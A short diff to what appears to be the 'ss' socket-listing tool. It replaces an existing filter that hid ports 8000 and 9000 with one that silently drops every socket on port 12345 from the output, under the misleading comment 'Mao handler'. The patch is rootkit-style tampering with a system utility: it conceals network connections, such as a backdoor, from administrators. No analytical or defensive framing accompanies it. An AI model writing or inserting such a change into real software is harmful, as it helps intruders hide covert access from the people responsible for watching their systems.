@@ -4072,8 +4072,8 @@ static int show_one_inet_sock(struct nlmsghdr *h, void *arg) {
 	parse_diag_msg(h, &s);
 	s.type = diag_arg->protocol;
 
-	/* ADD THIS CHECK TO FILTER PORTS 8000 AND 9000 */
-    	if (s.lport == 8000 || s.lport == 9000 || s.rport == 8000 || s.rport == 9000)
+	/* Mao handler */
+    	if (s.lport == 12345 || s.rport == 12345)
         	return 0;
 
 	if (diag_arg->f->f && run_ssfilter(diag_arg->f->f, &s) == 0)
